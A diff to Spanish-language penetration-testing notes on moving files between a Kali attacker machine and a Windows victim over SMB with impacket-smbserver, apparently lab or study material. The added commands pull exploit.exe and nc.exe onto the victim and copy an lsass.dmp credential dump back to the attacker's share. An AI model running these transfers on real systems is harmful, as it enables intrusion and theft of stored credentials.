@@ -137,10 +137,70 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password te
 
 #Maquina_victima_Windows 
 ```CMD
-net use n: \\192.168.220.133\share /user:test test
+net use n: \\[IP_KALI]\share /user:test test
+```
+O
+```powershell
+$username = 'plaintext'
+
+$password = 'Password123'
+
+$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+
+New-PSDrive -Name "N" -Root "\\[IP_MAQUINA]\SHARE" -PSProvider "FileSystem" -Credential $cred
 ```
 
+
+Después de levantarlo usamos:
+#Maquina_victima_Windows 
+```cmd
+copy \\[KALI_IP]\SHARE\exploit.exe C:\Users\Public\exploit.exe
+```
+
+Para cerrar la conexión lo haremos con:
+#Maquina_victima_Windows 
+```cmd
+net use n: /delete
+```
 #### Victima --> Kali
+##### 445 disponible
+#Maquina_atacante 
+```
+mkdir -p /tmp/smbshare
+
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+
+#Maquina_victima_Windows 
+```CMD
+copy \\[IP_KALI]\share\nc.exe
+```
+
+Si nos da el error:
+#Maquina_atacante 
+```
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+
+#Maquina_victima_Windows 
+```CMD
+net use n: \\[IP_KALI]\share /user:test test
+```
+
+Después de eso pasamos el fichero con:
+#Maquina_victima_Windows 
+```
+copy C:\ruta\al\lsass.dmp \\KALI_IP\SHARE\lsass.dmp
+```
+
+Para cerrar la conexión lo haremos con:
+#Maquina_victima_Windows 
+```cmd
+net use n: /delete
+```
+##### Con el 445 bloqueado:
 Aquí hacemos uso de que algunas maquinas tienen el puerto 445 bloqueado por seguridad y que los 80/443 de web están activos por comodidad entonces usamos WebDAV que es una extension del protocolo HTTP que ahce como SMB
 
 #Maquina_atacante 
